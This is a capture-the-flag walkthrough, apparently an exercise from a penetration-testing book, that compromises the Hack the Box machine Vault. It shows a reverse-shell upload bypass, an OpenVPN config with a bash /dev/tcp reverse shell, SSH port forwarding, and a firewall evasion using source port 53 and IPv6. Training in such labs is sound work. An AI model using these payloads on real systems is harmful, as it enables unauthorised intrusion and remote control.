# Exercise: Initial access and port forwarding on Hack the Box machine Vault

This machine was graded medium difficulty and was actually 3 separate virtual machines with hostnames: ubuntu, DNS and Vault. Although you will be dealing with pivoting later on, solving the machine required the use of local and remote port forwarding over SSH. An additional complication was the presence of a firewall that was blocking traffic to the Vault machine unless the source port was set to 53, the port usually associated with DNS. The firewall can be circumvented in a number of ways but the easiest is to use Ipv6 which hadn't been blocked by the firewall.

An nmap scan of the machine reveals SSH running on port 22 and HTTP running on port 80:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Vault]
└──╼ $sudo nmap -v -sC -sV --min-rate=1000 -T4 -p- vault.htb -oN Nmap/tcp-full
<SNIP>
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
<SNIP>
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
<SNIP>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the website on port 80, you get the text:

```text
Welcome to the Slowdaddy web interface
We specialize in providing finanancial organisations with strong web 
and database solutions and we promise to keep your customers financial 
data safe.
We are proud to announce our first client: Sparklays (Sparklays.com 
still under construction)
```

Running Gobuster, but with a modified wordlist to add "sparklays" and "Sparklays", you find the sub-directory "sparklays". Running gobuster on this directory reveals the following sub-directories and files:

```bash
┌─[rin@parrot]─[~/boxes/Vault]
└──╼ $gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://vault.htb/sparklays -x .php
<SNIP>
/login.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
```

And again, within the /design sub-directory, you find an additional directory /design/uploads. Navigating to the [http://vault.htb/sparklays/admin.php](http://vault.htb/sparklays/admin.php) returns a login page which doesn't return any errors or other feedback when testing out default username/password combinations like admin/admin. Putting this request into Burp Suite and changing the host header in the request to "localhost" however, you get redirected to another php page " sparklays-local-admin-interface-0001.php" which presents the page shown in Figure 3-2.

!\[Graphical user interface, text, application

Description automatically generated\]\(../.gitbook/assets/1.png\)

ault admin panel

Clicking on "Server Settings" leads to a page under construction. "Design Settings" however, returns a page that allows the logo to be changed. We can upload a PHP file that will give us a reverse shell. There are webshells already installed on Parrot Sec OS located in the directory /usr/share/webshells. We will use the PHP one:

`/usr/share/webshells/php/php-reverse-shell.php`

Copying this file to our working directory and renaming it reverse.php, we can try and upload it using the logo upload feature. The upload function restricts the file types that can be uploaded and so if you try and upload the PHP file you get an error returned saying "sorry that file type is not allowed". However, if you change the extension of the file to another valid PHP extension "reverse.php5", that is allowed. Start a Netcat listener to catch the reverse shell:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Vault]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
```

We can now navigate to the URL:

`http://vault.htb/sparklays/design/uploads/reverse.php5`

This then returns a reverse shell which you can upgrade to a full TTY using the Python and bash commands:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTL-Z
bg
stty raw -echo
fg
fg
```

We now have initial access as the user www-data. Exploring the /home directories, you see two users; "alex" and "dave". On exploring the "dave" directory, you find a sub-directory "Desktop" that has files which contain ssh credentials for the user "dave":

```bash
www-data@ubuntu:/home/dave/Desktop$ ls -al
total 20
drwxr-xr-x 2 dave dave 4096 Sep 3 2018 .
drwxr-xr-x 18 dave dave 4096 Sep 3 2018 ..
-rw-rw-r-- 1 alex alex 74 Jul 17 2018 Servers
-rw-rw-r-- 1 alex alex 14 Jul 17 2018 key
-rw-rw-r-- 1 alex alex 20 Jul 17 2018 ssh
www-data@ubuntu:/home/dave/Desktop$ cat Servers
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
www-data@ubuntu:/home/dave/Desktop$ cat key
itscominghome
www-data@ubuntu:/home/dave/Desktop$ cat ssh
dave
Dav3therav3123
www-data@ubuntu:/home/dave/Desktop$
```

We can now login using ssh and the user dave and the password Dav3therav3123.

In the file Servers, it mentioned another machine at the IP address "192.168.122.4". you can see from using the command "ifconfig" that the machine vault has 2 network interfaces with the interface "virbr0" having the IP address 192.168.122.1. you can check what ports might be on the machine with the IP address "192.168.122.4 by using Netcat:

`nc -vz 192.168.122.4 1-100`

The -v flag allows for verbose output and the -z flag does not connect to the port, it just checks if it could connect. Using this, you see that ports 22 and 80 are open.

We can now do a local port forward to get access to port 80 on the box 192.168.122.4

```bash
┌─[rin@parrot]─[~/boxes/Vault]
└──╼ $ssh -N -L 8081:192.168.122.4:80 dave@vault.htb
dave@vault.htb's password:
```

This then allows us to navigate to the web site at [http://127.0.0.1:8081](http://127.0.0.1:8081) where you get links related to DNS and VPN configuration \(Figure 3-4\).

![Home page on port 8081](../.gitbook/assets/2%20%282%29.png)

The first link goes to a page under construction. The second is a page that allows for openvpn configurations to be tested \(Figure 3-5\).

![VPN Configurator page](../.gitbook/assets/3%20%281%29.png)

Searching for OpenVPN configuration exploits, you find a blog post by Jacob Baines[\[2\]](exercise-initial-access-and-port-forwarding-on-hack-the-box-machine-vault.md) which gives a configuration for returning a reverse shell. Adapting this, you can paste the following into the page, update the file and then click Test VPN.

```bash
Remote 192.168.122.1
nobind
dev tun
script-security 2
up ​"/bin/bash -c '/bin/bash -I > /dev/tcp/192.168.122.1/6002 0<&1 2>&1&'"
```

Rather than run the Netcat listener on the Vault machine however, you can use another SSH remote port forwarder to tunnel the shell back to our local machine. To do this from an existing SSH session, you can use the special characters ~C at the beginning of the command prompt to drop into an SSH prompt and then set up the remote port forward:

```bash
dave@ubuntu:~$
ssh> -R 6002:127.0.0.1:6002
Forwarding port.
dave@ubuntu:~$
```

Setting up the listener on the local machine will then give us a reverse shell on the DNS machine as root.

```bash
┌─[rin@parrot]─[~/boxes/Vault]
└──╼ $nc -lvnp 6002
listening on [any] 6002 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56806
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html#
```

Looking around the box, you find that the ssh file in /home/dave has a password dav3gerous567.

Looking at the /etc/hosts file, you see an entry for the vault machine:

```bash
root@DNS:/home/dave# cat /etc/hosts
cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 DNS
192.168.5.2 Vault
# The following lines are desirable for Ipv6 capable hosts
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The machine doesn’t respond to a ping but using nmap on the Vault machine, you find two ports that are closed:

```bash
PORT      STATE   SERVICE
53/tcp    closed  domain
4444/tcp  closed  krb524
```

There is a possibility that this response is just poor firewall design and that the reason that 53 responded as closed was because the firewall may be letting anything that looks like DNS traffic through to the box. You can re-run nmap but specify the source port as 53. This gives an open port 987

```bash
PORT     STATE SERVICE
987/tcp  open  unknown
```

Running netcat to connect to that port returns and SSH banner suggesting that you can SSH onto that box.

```bash
root@DNS:/home/dave# nc -p 53 Vault 987
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

There are a couple of ways of getting around the firewall restriction to get to the Vault machine. The easiest however is to use Ipv6. In order to do that, you need to find the Ipv6 address of Vault. If you ping the Ipv6 broadcast address, the ping will go to all hosts on the network connected to the "ens3" network interface:

```bash
root@DNS:/home/dave# ping6 -I ens3 ff02::1
PING ff02::1(ff02::1) from fe80::5054:ff:fe17:ab49 ens3: 56 data bytes
64 bytes from fe80::5054:ff:fe17:ab49: icmp_seq=1 ttl=64 time=0.026 ms
64 bytes from fe80::5054:ff:fec6:7066: icmp_seq=1 ttl=64 time=2.48 ms (DUP!)
64 bytes from fe80::5054:ff:fe3a:3bd5: icmp_seq=1 ttl=64 time=2.49 ms (DUP!)
64 bytes from fe80::5054:ff:fee1:7441: icmp_seq=1 ttl=64 time=3.03 ms (DUP!)
```

From this, you get 4 responses. The first response from fe80::5054:ff:fe17:ab49 you know is from the DNS machine as you can see its Ipv6 address using the ifconfig command. Using the nmap command, you can check which machine has port 987 open and you find that it is the machine with the Ipv6 address fe80::5054:ff:fec6:7066.

We can then just ssh in using the ssh command:

```bash
ssh -p 987 dave@fe80::5054:ff:fec6:7066%ens3
```

Once on the box, you can see the root flag that is encrypted using GPG. You can use the gpg application to get more information about the file and find that it has been encrypted using an RSA key with the ID D1EB1F03.

```bash
dave@vault:~$ ls
root.txt.gpg
dave@vault:~$ gpg root.txt.gpg
gpg: directory `/home/dave/.gnupg' created
gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/dave/.gnupg/secring.gpg' created
gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
This key doesn't exist on the Vault machine but does on the ubuntu machine:
dave@ubuntu:~$ gpg --list-keys
/home/dave/.gnupg/pubring.gpg
pub 4096R/0FDFBFE4 2018-07-24
uid avid <dave@david.com>
sub 4096R/D1EB1F03 2018-07-24
```

We can use scp \(SSH copy utility\) to copy the file onto the DNS box and then onto the ubuntu machine and decrypt using gpg and the passphrase "itscominghome" that you found in the file called Key earlier.

